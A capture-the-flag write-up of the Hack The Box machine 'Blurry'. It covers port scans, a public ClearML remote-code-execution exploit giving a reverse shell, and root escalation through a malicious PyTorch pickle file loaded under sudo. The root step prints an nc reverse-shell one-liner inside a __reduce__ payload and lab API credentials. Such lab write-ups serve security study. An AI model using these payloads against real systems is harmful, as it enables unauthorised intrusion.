# HTB – Blurry
### TL;DR
This is a Debian 11 machine dedicated to train and deploy ML and LLM models. It runs a vulnerable version of CleanML which can be exploited to get an initial user shell. Regarding escalation, we abuse the deserialization feature of the Python PyTorch machine learning library.
### KEYWORDS
CleanML, CVE-2024-24590, PyTorch, Pickle, insecure deserialization.
### REFERENCES
https://www.cvedetails.com/cve/CVE-2024-24590/<br> https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit<br>
https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/<br>
https://medium.com/@yulin_li/what-exactly-is-the-pth-file-9a487044a36b<br>
https://docs.python.org/3/library/pickle.html<br>
https://github.com/trailofbits/fickling<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 09:44 EDT
Nmap scan report for 10.10.11.19
Host is up, received user-set (0.038s latency).
Not shown: 63537 closed tcp ports (conn-refused), 1996 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv -n
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 09:45 EDT
Nmap scan report for 10.10.11.19
Host is up, received user-set (0.24s latency).
Scanned at 2024-09-24 09:45:00 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```
Add to hosts file and enumerate the site with Firefox. A ClearML web site appears, according to the developers site, this is "a platform to build, train, and deploy your AI/ML and LLM models".
### USER
Look for ClearML vulnerabilities, there is this one here: https://www.cvedetails.com/cve/CVE-2024-24590/. And an associated exploit here: https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit.<br>
<br>
In CleanML, open one the project "Black Swan" and click on "New experiment". You are presented instructions to configure a local `clearml` client.

![Untitled](https://github.com/user-attachments/assets/1329b3ae-d038-4815-bd72-e11a8f7b6fdc)

Follow the instructions, first install `clearml` client.
```markdown
> pip install clearml
```
Then run the configuration script `clearml-init` and paste the API configuration.
```markdown
> /home/kali/.local/bin/clearml-init

ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "HWX9ONLPLTODL5NZ2DEO"
    "secret_key" = "FdPvJ2fwfRYcqXs4CmQPAddC7RSuFFajPTsd1E7BXUgIlLXDJg"
  }
}
Detected credentials key="HWX9ONLPLTODL5NZ2DEO" secret="FdPv***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/kali/clearml.conf
ClearML setup completed successfully.
```

![Untitled2](https://github.com/user-attachments/assets/e65c7eab-415f-48a9-ae67-01e53cdabf3a)

Now start a listener and run the `exploit.py` from the GitHub repository. Enter option 2 (run exploit), then enter your IP and the listener port. Finally enter the project name, which is the one you used to create the experiment ("Black Swan" in this case).<br>
<br>

![Untitled4](https://github.com/user-attachments/assets/e7e43d49-bde3-47d5-952e-d1f70b731858)

Shortly after, a reverse shell for user `jippity` is received on port 1919.

![Untitled5](https://github.com/user-attachments/assets/d206aeff-6a99-4231-8368-4798bd0f59fe)

To stabilize this shell we move to `.ssh` folder and retrieve a private key, then use it to open an SSH session as user `jippity`

![Untitled6](https://github.com/user-attachments/assets/2822cb2b-23af-43c2-913a-b88ca13520fa)

Which can be used to retrieve the user flag.
### ROOT
Start from the `jippity` SSH session and take the opportunity to enumerate the user and the system.
```markdown
> uname -a && cat /etc/os-release
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL=https://bugs.debian.org/

> whoami && id
jippity
uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
# check sudo configuration
sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
```
User `jippity` may run the following `sudo` command on the host:
```markdown
> sudo -l
...
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```
Basically, the user is allowed to run `/usr/bin/evaluate_model` as root with the `.pth` files located in the `/models` directory. No password will be prompted.<br>
<br>
Enumerate the script `/usr/bin/evaluate_model`
```markdown
> cat /usr/bin/evaluate_model
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/opt/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
fi
```
We see the script checks input file (which is called "model file"), extracts it and run binary `/usr/local/bin/fickling` on it. Other interesting things mentioned are a library called PyTorch and a Python script located `/models/evaluate_model.py`<br>
<br>
Enumerate the Python script<br>
```markdown
> cat /models/evaluate_model.py
import torch
import torch.nn as nn
from torchvision import transforms
from torchvision.datasets import CIFAR10
from torch.utils.data import DataLoader, Subset
import numpy as np
import sys

class CustomCNN(nn.Module):
    def __init__(self):
        super(CustomCNN, self).__init__()
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
        self.fc2 = nn.Linear(in_features=128, out_features=10)
        self.relu = nn.ReLU()

    def forward(self, x):
        x = self.pool(self.relu(self.conv1(x)))
        x = self.pool(self.relu(self.conv2(x)))
        x = x.view(-1, 32 * 8 * 8)
        x = self.relu(self.fc1(x))
        x = self.fc2(x)
        return x

def load_model(model_path):
    model = CustomCNN()
    
    state_dict = torch.load(model_path)
    model.load_state_dict(state_dict)
    
    model.eval()  
    return model

def prepare_dataloader(batch_size=32):
    transform = transforms.Compose([
        transforms.RandomHorizontalFlip(),
        transforms.RandomCrop(32, padding=4),
        transforms.ToTensor(),
        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
    ])
    
    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
    return dataloader

def evaluate_model(model, dataloader):
    correct = 0
    total = 0
    with torch.no_grad():  
        for images, labels in dataloader:
            outputs = model(images)
            _, predicted = torch.max(outputs.data, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()

    accuracy = 100 * correct / total
    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')

def main(model_path):
    model = load_model(model_path)
    print("[+] Loaded Model.")
    dataloader = prepare_dataloader()
    print("[+] Dataloader ready. Evaluating model...")
    evaluate_model(model, dataloader)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_model.pth>")
    else:
        model_path = sys.argv[1]  # Path to the .pth file
        main(model_path)
```
Here we see more references to a library called `torch`, and a call to the function `torch.load(model_path)`, which is executed on the input file (the "model file").<br>
<br>
Now it is time to make some research on the things we have discovered. Long story short:
* PyTorch is an open-source machine learning library for Python based on the `torch` library. When needed, it stores serialized data as `.pth` files. It uses the functions `torch.save()` for serializing and `torch.load()` for deserializing (https://medium.com/@yulin_li/what-exactly-is-the-pth-file-9a487044a36b).
* PyTorch functions rely on the Python `pickle` module, which is who actually implements the binaries for serializing and deserializing data (https://docs.python.org/3/library/pickle.html).
* Finally, `fickling` is a tool to manage Python pickle serialized objects (https://github.com/trailofbits/fickling).<br>
<br>

With this in mind, it seems we should focus on finding vulnerabilties on the Python serialization/deserialization process ("pickling"). These are well explained here: https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/<br>
<br>
In summary, custom pickling and unpickling code can be used with a method called `__reduce__`. I took the script published in the mentioned site and, after some modifications and testing, I found a workable malicious script.
```python
import torch
import os
import pickle

class Evilpickle:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your ip here> 1919 >/tmp/f',))

pickle_data = Evilpickle()
torch.save(pickle_data, '/models/exploit.pth')
```
I modified the script in the site to add a call to `torch.save()` to serialize the data, and get rid of the `pickle.dumps()` function.<br>
<br>
Save the script as `~/exploit.py` and execute it to generate the serialized malicious model file `exploit.pth`
```markdown
> python3 ~/exploit.py
```
Now we have a malicious serialized payload in `/models/exploit.pth`. Start a listener and run it with `sudo`
```markdown
> sudo /usr/bin/evaluate_model /models/exploit.pth
[+] Model /models/exploit.pth is considered safe. Processing...
rm: cannot remove '/tmp/f': No such file or directory
```
A root shell is received on port 1919.

![Untitled7](https://github.com/user-attachments/assets/eefcd68f-3437-4477-af60-b4fd9c8a7369)

You are root.
